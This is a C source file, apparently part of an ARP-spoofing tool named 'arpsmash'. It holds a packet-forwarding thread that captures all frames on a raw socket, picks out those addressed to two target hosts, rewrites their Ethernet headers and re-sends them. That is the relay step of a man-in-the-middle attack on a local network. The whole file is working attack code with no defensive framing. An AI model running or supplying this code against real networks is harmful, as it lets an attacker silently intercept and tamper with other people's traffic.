#include "arpsmash.h"

void* forward (void *arg)  {
	__u8 pack[PACK_MAXSIZE];
	struct ethhdr eth;
	struct iphdr ip;
	struct sockaddr_ll sll;
	struct ifreq ifr;
	int raw,sll_size=sizeof(sll);
	__u8 *myhw;

	bzero (&sll,sizeof(sll));
	bzero (&ifr,sizeof(ifr));
	myhw=get_hw_addr(ifc);

	if((raw=socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL)))<0)  {
		fprintf (stderr,"*** Error - Unable to initialize raw socket: %s\n",strerror(errno));
		die(-1);
	}

	strncpy((char *)ifr.ifr_name, ifc, IFNAMSIZ);

	if((ioctl(raw, SIOCGIFINDEX, &ifr))<0)  {
		fprintf (stderr,"*** Error - Unable to ioctl(): %s\n",strerror(errno));
		die(-2);
	}

	sll.sll_family = AF_PACKET;
	sll.sll_ifindex = ifr.ifr_ifindex;
	sll.sll_protocol = htons(ETH_P_ALL);
	sll.sll_halen=ETH_ALEN;
	memcpy (&sll.sll_addr, (__u8*) myhw, ETH_ALEN);

	if(bind(raw, (struct sockaddr*) &sll, sll_size)<0)  {
		fprintf (stderr,"*** Unable to bind: %s\n",strerror(errno));
		die(-3);
	}

	while (1)  {
		bzero (pack,sizeof(pack));
		bzero (&eth,sizeof(eth));
		bzero (&ip,sizeof(ip));

		if (recvfrom(raw, (__u8*) pack, PACK_MAXSIZE, 0, (struct sockaddr*) &sll, &sll_size)<0)  {
			fprintf (stderr,"*** Error while receiving from %s: %s\n",ifc,strerror(errno));
			die(-4);
		}

		memcpy (&eth,pack,sizeof(eth));
		memcpy (&ip,pack+ETH_LEN,sizeof(ip));

		char addr[INET6_ADDRSTRLEN];
		inet_ntop (AF_INET,&ip.daddr,addr,sizeof(addr));

		if (ip.daddr==inet_addr(t1) || ip.daddr==inet_addr(t2))  {
			unsigned short int len=htons(ip.tot_len)+ETH_LEN;
			memcpy (eth.h_source, (__u8*) myhw, ETH_ALEN);

			if (ip.daddr==inet_addr(t1))  {
				memcpy (eth.h_dest, (__u8*) t1_hw, ETH_ALEN);
				memcpy (pack, (void*) &eth, sizeof(eth));
			}

			if (ip.daddr==inet_addr(t2))  {
				memcpy (eth.h_dest, (__u8*) t2_hw, ETH_ALEN);
				memcpy (pack, (void*) &eth, sizeof(eth));
			}

			if (sendto(raw, (__u8*) pack, len, 0,
						(struct sockaddr*) &sll, sizeof(struct sockaddr_ll))<0)  {
				fprintf (stderr,"*** Error in sendto: %s\n",strerror(errno));
			}
		}
	}
}

